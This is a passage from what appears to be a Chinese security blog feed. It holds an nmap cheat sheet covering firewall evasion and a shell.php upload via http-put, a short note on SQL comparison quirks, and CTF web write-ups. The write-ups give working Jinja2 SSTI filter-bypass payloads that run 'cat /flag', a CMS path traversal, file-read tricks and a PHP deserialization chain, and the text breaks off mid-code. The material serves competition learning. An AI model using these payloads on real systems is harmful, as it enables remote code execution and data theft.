class="language-bash">指定扫描速度</span></span><br><span class="line">-T0：非常慢的速度</span><br><span class="line">-T1：慢速</span><br><span class="line">-T2：正常速度</span><br><span class="line">-T3：快速</span><br><span class="line">-T4：非常快的速度</span><br><span class="line">-T5：极快的速度</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出扫描结果</span></span><br><span class="line">-oA &lt;file&gt;: 三种格式文件</span><br><span class="line">-oN &lt;file&gt;：将扫描结果保存为普通文本文件</span><br><span class="line">-oX &lt;file&gt;：将扫描结果保存为XML文件</span><br><span class="line">-oG &lt;file&gt;：将扫描结果保存为可读性更好的格式</span><br><span class="line">nmap -oA example_scan www.example.com # 这将在当前目录中创建三个文件，文件名分别为：xample_scan.nmap：普通格式 example_scan.xml：XML格式 example_scan.gnmap：可grep格式</span><br><span class="line">nmap -oN result.txt www.example.com  # 将扫描结果保存为普通文本文件</span><br><span class="line">nmap -oX result.xml www.example.com  # 将扫描结果保存为XML文件</span><br><span class="line">nmap -oG result.txt www.example.com  # 将扫描结果保存为可读性更好的格式</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用脚本</span></span><br><span class="line">要从nmap脚本库中激活一个脚本，可以使用--script选项，后跟要激活的脚本名称。例如，以下命令将激活http-title脚本，该脚本可用于提取目标Web服务器的标题：</span><br><span class="line">nmap --script=http-title www.example.com</span><br><span class="line">您还可以使用逗号分隔的列表来激活多个脚本。例如，以下命令将激活http-title和http-headers脚本：</span><br><span class="line">nmap --script=http-title,http-headers www.example.com</span><br><span class="line">如果您想要激活所有脚本，可以使用 --script=all 选项。这将激活nmap脚本库中的所有脚本，但可能会导致扫描时间变长。</span><br><span class="line">nmap --script=all www.example.com</span><br><span class="line">以下命令将激活所有&quot;vuln&quot;类别中的脚本，并对www.example.com进行扫描：</span><br><span class="line">nmap --script=vuln www.example.com</span><br><span class="line">脚本库</span><br><span class="line">safe ：- 不会影响目标</span><br><span class="line">intrusive ：- 不安全：可能会影响目标</span><br><span class="line">vuln ：- 扫描漏洞</span><br><span class="line">exploit ：- 尝试利用漏洞</span><br><span class="line">auth ：- 尝试绕过正在运行服务的身份验证（例如匿名登录FTP服务器）</span><br><span class="line">brute ：- 尝试暴力破解正在运行服务的凭据</span><br><span class="line">discovery ：- 尝试查询正在运行的服务以获取有关网络的更多信息（例如查询 SNMP 服务器）。</span><br><span class="line">https://nmap.org/book/nse-usage.html</span><br><span class="line">某些脚本需要参数（例如，凭据，如果它们正在利用经过身份验证的漏洞）。这些可以通过 --script-args Nmap开关提供。这方面的一个例子是 http-put 脚本（用于使用 PUT 方法上传文件）。这需要两个参数：要将文件上传到的 URL 和文件在磁盘上的位置。例如：</span><br><span class="line">nmap -p 80 --script http-put --script-args http-put.url=&#x27;/dav/shell.php&#x27;,http-put.file=&#x27;./shell.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="搜索NSE脚本"><a href="#搜索NSE脚本" class="headerlink" title="搜索NSE脚本"></a>搜索NSE脚本</h3><p><code>grep &quot;&#123;脚本名字&#125;&quot; /usr/share/nmap/scripts/script.db</code></p><h3 id="防火墙规避"><a href="#防火墙规避" class="headerlink" title="防火墙规避"></a>防火墙规避</h3><p><code>-f</code> ：- 用于对数据包进行分段（即将它们分成更小的部分），使防火墙或 IDS 不太可能检测到数据包。</p><p><code>-f</code> 替代方法，但可以更好地控制数据包的大小： <code>--mtu &lt;number&gt;</code> ，接受用于发送的数据包的最大传输单元大小。这必须是 8 的倍数。</p><p><code>--scan-delay &lt;time&gt;ms</code> ：- 用于在发送的数据包之间添加延迟。如果网络不稳定，这非常有用，但对于规避可能存在的任何基于时间的防火墙/ IDS触发器也非常有用。</p><p><code>--badsum</code> ：- 这用于生成无效的数据包校验和。任何真正的TCP / IP堆栈都会丢弃此数据包，但是，防火墙可能会自动响应，而无需费心检查数据包的校验和。因此，此开关可用于确定是否存在防火墙/IDS。</p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于sql的一些理解</title>
      <link href="/2023/04/25/%E5%85%B3%E4%BA%8Esql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
      <url>/2023/04/25/%E5%85%B3%E4%BA%8Esql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入那些事"><a href="#sql注入那些事" class="headerlink" title="sql注入那些事"></a>sql注入那些事</h2><p>关于为什么 select * from user where ‘a1’ = ‘e1’ = ‘1’; 和 select * from user where ‘1’=’a1’ = ‘e1’;查询出来sql的值不一样</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230425230152933.png" alt="image-20230425230152933"></p><blockquote><p>首先这里说一点，sql字符串具有跟php字符串类似的性质，比如说，如果是以非数字开头的</p><p>例如: <code>&#39;qdadada&#39; &#39;adad&#39;</code> 这些字符串的逻辑值为<code>0</code></p><p>如果是以数字开头的</p><p>例如: <code>&#39;1aaaa&#39; &#39;2bbb&#39;</code> 这些字符串的逻辑值为<code>1</code></p></blockquote><h3 id="39-a1-39-39-e1-39-39-1-39-和-39-1-39-39-a1-39-39-e1-39-的区别"><a href="#39-a1-39-39-e1-39-39-1-39-和-39-1-39-39-a1-39-39-e1-39-的区别" class="headerlink" title="&#39;a1&#39; = &#39;e1&#39; = &#39;1&#39; 和 &#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;的区别"></a><code>&#39;a1&#39; = &#39;e1&#39; = &#39;1&#39;</code> 和<code> &#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;</code>的区别</h3><ul><li>执行顺序不同，造成执行结果截然不同。</li></ul><h4 id="39-a1-39-39-e1-39-39-1-39"><a href="#39-a1-39-39-e1-39-39-1-39" class="headerlink" title="&#39;a1&#39;= &#39;e1&#39; = &#39;1&#39;"></a><code>&#39;a1&#39;= &#39;e1&#39; = &#39;1&#39;</code></h4><ol><li>首先 <code>&#39;a1&#39; = &#39;e1&#39;</code>因为是字符串比较，所以返回false</li><li>表达式就变成了 <code>false = &#39;1&#39;</code> </li><li><code>&#39;1&#39;</code>的逻辑值为 1</li></ol><p>所以<code>false = &#39;1&#39;</code>返回了false</p><h4 id="39-1-39-39-a1-39-39-e1-39"><a href="#39-1-39-39-a1-39-39-e1-39" class="headerlink" title="&#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;"></a><code>&#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;</code></h4><ol><li>首先 <code>&#39;1&#39; = &#39;e1&#39;</code>是字符串比较 返回 fasle</li><li>所以表达式变成了 <code>false = &#39;e1&#39;</code></li><li><code>&#39;e1&#39;</code>的逻辑值为0</li></ol><p>所以最终为 false = ‘e1’ 返回了true</p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷杯-web-wp</title>
      <link href="/2023/04/20/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-web-wp/"/>
      <url>/2023/04/20/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-web-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>没docker环境，赛后不好写wp，比赛时候忘记写wp了</p></blockquote><p>[TOC]</p><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>把变量字符串改短，然后搭到本地环境就好了，然后点击下</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204105304.png" alt="image-20230420204105304"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204217900.png" alt="image-20230420204217900"></p><h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a>Dreamer</h2><p>首先下载给的源码，源码里面有后台管理员的登录账号和密码。</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204407015.png" alt="image-20230420204407015"></p><p>然后到项目源码里面找到主题源码位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src\main\resources\db\dreamer-cms\templates</span><br></pre></td></tr></table></figure><p>随便一个主题找到<code>theme.json</code>把<code>themepath</code>对应的值改成<code>../../../../../../../../../../../../../../</code></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204642439.png" alt="image-20230420204642439"></p><p>然后上传主题包到后台管理的<code>风格管理</code>页面，</p><p><img src="https://foruda.gitee.com/images/1678954524753194744/7480eb3d_8686450.png" alt="输入图片说明"></p><p>然后在<code>模板管理</code>里面就可以遍历任意文件拿到flag了。不够我没有getshell，可能是环境没有定时任务</p><p><a href="https://gitee.com/isoftforce/dreamer_cms/issues/I6NP86">🛡️ 后台模板管理可以任意编辑导致GetShell · Issue #I6NP86 · 王俊南/Dreamer CMS（梦想家CMS内容管理系统） - Gitee.com</a></p><h2 id="Dreamer-revenge"><a href="#Dreamer-revenge" class="headerlink" title="Dreamer_revenge"></a>Dreamer_revenge</h2><p>同上，只有最后一步不一样。</p><p>读取/proc/1/environ的内容可以拿到flag，</p><p><a href="https://blog.csdn.net/m0_47696151/article/details/121947320"> 解析 linux 进程 pid 0, pid 1, pid 2 关系及启动过程_pid为0的进程_lylhw13_的博客-CSDN博客</a></p><p>首先推测flag在环境变量里面，因为这个题目根目录没flag，然后推测是docker环境在创建的时候同时设置到flag，所以在pid1里面寻找flag</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF—web-wp</title>
      <link href="/2023/04/20/GDOUCTF%E2%80%94web-wp/"/>
      <url>/2023/04/20/GDOUCTF%E2%80%94web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="ez-ze"><a href="#ez-ze" class="headerlink" title="ez_ze"></a>ez_ze</h2><blockquote><p>SSTI被过滤<code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; `  `&#125;&#125;</code> 绕过方法。</p></blockquote><p>FUZZ跑一下测出来过滤了下列字符</p><p><code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; `   `&#125;&#125;</code></p><p>这个题目如果没有过滤<code>\</code>就可以用unicode编码之类的绕过，但是过滤了<code>\</code>所以不能用unicode，</p><p>payload1:</p><p>采用 jinja2的过滤器attr和format</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c&#x27;|format(95,95,109,114,111,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(1)|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(132)|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;cat /f*&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure><p>payload2:</p><p>采用jinja2的过滤器attr和利用 flask的request方法来进行获取<code>__</code> (下面的payload要用burpsuite，不然被url编码以后就会失效)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /get_flag?__</span><br><span class="line">&#123;% for c in request|attr(&#x27;args&#x27;) %&#125;&#123;%print(&#x27;&#x27;|attr(c%2b&#x27;cla&#x27;&#x27;ss&#x27;%2bc)|attr(c%2b&#x27;ba&#x27;&#x27;se&#x27;%2bc)|attr(c%2b&#x27;subcl&#x27;&#x27;asses&#x27;%2bc)()|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(132)|attr(c%2b&#x27;in&#x27;&#x27;it&#x27;%2bc)|attr(c%2b&#x27;glob&#x27;&#x27;als&#x27;%2bc)|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;cat /flag&#x27;)|attr(&#x27;read&#x27;)()) %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW愚人杯-web</title>
      <link href="/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/"/>
      <url>/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>这个题目很明显存在任意文件读取</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408231659276.png" alt="image-20230408231659276"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408231735400.png" alt="image-20230408231735400"></p><p>简单的base64</p><p>传一个img=aW5kZXgucGhw就得到flag了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;29728952-b4b7-44c3-a4a1-46bfd8789da8&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h3><p>这个题目首先要拿到 check.php 里面的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> w_wuw_w;</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">&quot;php://filter/convert.base64-encode/resource=check.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;aaa = &amp;<span class="variable">$a</span>-&gt;key;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;s:0:&quot;&quot;;s:3:&quot;key&quot;;R:2;s:4:&quot;file&quot;;s:53:&quot;php://filter/convert.base64-encode/resource=check.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230408233216873.png" alt="image-20230408233216873"></p><p>check.php 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一个很简单的移位，函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> + <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终链条 <code>w_wuw_w(__destruct) -&gt;gBoBg(__toString) -&gt;w_wuw_w(__invoke) -&gt;EeE(__clone) -&gt;cycycycy(aaa)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;src/check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// w_wuw_w(__destruct) -&gt;gBoBg(__toString) -&gt;w_wuw_w(__invoke) -&gt;EeE(__clone) -&gt;cycycycy(aaa)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span> = <span class="string">&quot;-_-&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span 